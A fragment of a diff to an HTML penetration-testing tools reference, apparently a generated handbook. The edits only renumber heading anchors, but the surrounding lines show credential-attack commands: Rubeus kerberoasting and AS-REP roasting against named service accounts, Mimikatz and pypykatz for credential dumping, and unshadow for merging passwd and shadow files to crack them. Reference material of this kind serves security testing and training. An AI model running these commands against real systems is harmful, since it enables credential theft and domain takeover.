 <pre><code class="language-sh">medusa -h
 </code></pre>
@@ -34576,7 +35630,7 @@ sudo apt-get -y install medusa
 <h3 id="basic-search-syntax"><a class="header" href="#basic-search-syntax">Basic Search Syntax</a></h3>
 <pre><code class="language-bash">search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]
 </code></pre>
-<h3 id="search-options-1"><a class="header" href="#search-options-1">Search Options</a></h3>
+<h3 id="search-options-2"><a class="header" href="#search-options-2">Search Options</a></h3>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -35644,7 +36698,7 @@ msf6 &gt; jobs -K
 <li><strong>DCSync</strong>: Replicate credentials from Domain Controllers</li>
 </ul>
 <hr>
-<h2 id="installation-10"><a class="header" href="#installation-10">Installation</a></h2>
+<h2 id="installation-12"><a class="header" href="#installation-12">Installation</a></h2>
 <p>Mimikatz is not installed via package managers. Download from the official repository:</p>
 <pre><code>https://github.com/gentilkiwi/mimikatz/releases
 </code></pre>
@@ -36349,7 +37403,7 @@ run -j
 <li><strong>Cross-Platform</strong>: Works on Linux, macOS, and Windows</li>
 </ul>
 <hr>
-<h2 id="installation-11"><a class="header" href="#installation-11">Installation</a></h2>
+<h2 id="installation-13"><a class="header" href="#installation-13">Installation</a></h2>
 <pre><code class="language-bash"># Via pip
 pip3 install pypykatz
 
@@ -36567,7 +37621,7 @@ NTLM: aad3b435b51404eeaad3b435b51404ee
 <li><strong>PKINIT</strong>: Request TGTs using X.509 certificates (Pass-the-Certificate)</li>
 </ul>
 <hr>
-<h2 id="installation-12"><a class="header" href="#installation-12">Installation</a></h2>
+<h2 id="installation-14"><a class="header" href="#installation-14">Installation</a></h2>
 <p>Rubeus is not installed via package managers. Compile from source or download pre-compiled:</p>
 <pre><code>https://github.com/GhostPack/Rubeus
 </code></pre>
@@ -36643,7 +37697,7 @@ NTLM: aad3b435b51404eeaad3b435b51404ee
 <h3 id="extract-all-kerberoastable-hashes"><a class="header" href="#extract-all-kerberoastable-hashes">Extract All Kerberoastable Hashes</a></h3>
 <pre><code class="language-cmd">Rubeus.exe kerberoast /nowrap
 </code></pre>
-<h3 id="specific-user"><a class="header" href="#specific-user">Specific User</a></h3>
+<h3 id="specific-user-1"><a class="header" href="#specific-user-1">Specific User</a></h3>
 <pre><code class="language-cmd">Rubeus.exe kerberoast /user:svc_mssql /nowrap
 </code></pre>
 <h3 id="hashcat-compatible-format"><a class="header" href="#hashcat-compatible-format">Hashcat-Compatible Format</a></h3>
@@ -36661,7 +37715,7 @@ NTLM: aad3b435b51404eeaad3b435b51404ee
 <h3 id="extract-all-as-rep-roastable-hashes"><a class="header" href="#extract-all-as-rep-roastable-hashes">Extract All AS-REP Roastable Hashes</a></h3>
 <pre><code class="language-cmd">Rubeus.exe asreproast /nowrap
 </code></pre>
-<h3 id="specific-user-1"><a class="header" href="#specific-user-1">Specific User</a></h3>
+<h3 id="specific-user-1-1"><a class="header" href="#specific-user-1-1">Specific User</a></h3>
 <pre><code class="language-cmd">Rubeus.exe asreproast /user:svc_backup /nowrap
 </code></pre>
 <h3 id="hashcat-format"><a class="header" href="#hashcat-format">Hashcat Format</a></h3>
@@ -36808,7 +37862,7 @@ des_cbc_md5          : ...
 </ul>
 <p>Unshadow merges these files so that password crackers have access to both the hash and the user context (username, real name from GECOS field) in a single file.</p>
 <hr>
-<h2 id="installation-13"><a class="header" href="#installation-13">Installation</a></h2>
+<h2 id="installation-15"><a class="header" href="#installation-15">Installation</a></h2>
 <p>Unshadow comes bundled with John the Ripper. On Debian-based systems:</p>
 <pre><code class="language-sh">sudo apt-get install john
 </code></pre>
@@ -36816,7 +37870,7 @@ des_cbc_md5          : ...
 <pre><code class="language-sh">which unshadow
 </code></pre>
 <hr>
-<h2 id="basic-syntax-17"><a class="header" href="#basic-syntax-17">Basic Syntax</a></h2>
+<h2 id="basic-syntax-21"><a class="header" href="#basic-syntax-21">Basic Syntax</a></h2>
 <pre><code class="language-sh">unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
 </code></pre>
 <hr>
